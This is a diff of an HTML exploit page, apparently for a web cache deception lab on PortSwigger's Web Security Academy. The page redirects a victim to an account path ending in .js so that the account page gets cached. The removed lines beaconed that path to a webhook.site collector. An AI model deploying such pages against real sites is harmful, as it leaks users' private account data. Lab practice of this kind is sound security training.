@@ -1,20 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-</head>
 <body>
 <script>
-  const path = "/my-account/poc" + Date.now() + ".js";
-  const target = "https://0a1600b3045daf6e80c70342006e008e.web-security-academy.net" + path;
-  
-  // Fire webhook FIRST
-  new Image().src = "https://webhook.site/04a0f607-8cea-42e8-94c8-828afff2780d?path=" + encodeURIComponent(path);
-  
-  // Wait 1 second for webhook to fire, THEN redirect
-  setTimeout(function() {
-    document.location = target;
-  }, 1000);
+  document.location="https://0a1600b3045daf6e80c70342006e008e.web-security-academy.net/my-account/poc999.js";
 </script>
 </body>
 </html>
+```
+
+Then you already know the URL to visit:
+```
+https://0a1600b3045daf6e80c70342006e008e.web-security-academy.net/my-account/poc999.js
